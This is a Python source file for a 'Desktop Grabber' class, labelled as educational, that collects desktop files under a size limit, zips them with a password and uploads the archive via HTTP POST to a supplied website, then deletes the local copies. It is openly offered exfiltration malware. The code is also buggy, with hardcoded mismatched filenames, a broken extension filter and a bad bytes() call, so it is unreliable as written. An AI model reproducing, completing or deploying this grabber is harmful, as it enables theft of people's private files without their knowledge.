import requests
import pyminizip
from zipfile import ZipFile
import os


# Desktop Grabber
# For educational purpose only!

class DeskGrab:

    def __init__(self, ZipName, ZipPassword):
        self.ZipName = ZipName + ".zip"
        self.ZipPassword = ZipPassword
        self.ForbExt = []
        self.SizeLimit = 8388608
        self.CurrentDir = "."

    def _dirTraversel(self, directory):
        files = os.listdir(directory)
        approved_files = []
        for i in files:
            # Checks for forbidden file ext.
            if i not in self.ForbExt:
                file_size = os.path.getsize(i)
                if not file_size >= self.SizeLimit:
                    approved_files.append(i)
                else: print("File To Large!")

        return approved_files



    def _createZip(self, file_list):
        output_file = "test2.zip"
        compress_level = 5
        # Creating the zipfile
        try:
            with ZipFile(self.ZipName, "w") as zipobj:
                for i in file_list:
                    zipobj.write(i)
                zipobj.setpassword(bytes(self.ZipPassword))
                zipobj.close()
            return True
        except: return False


    def _protectZip(self, output_file):
        self.output_file = output_file
        pyminizip.compress("Test.zip", None, output_file, self.ZipPassword, 5)



    def _sendPackage(self, website):
        # We use a simple POST request to send file
        try:
            file = open(str(self.output_file), "rb").read()
            response = requests.post(website, files={"archive": ("Test2.zip", file)})
        except: print(1)

        if response.ok:
            print("Upload completed successfully!")
            print(response.text)
            os.remove(self.ZipName)
            os.remove(self.output_file)
            return True
        else:
            print("Something went wrong!")
            return False



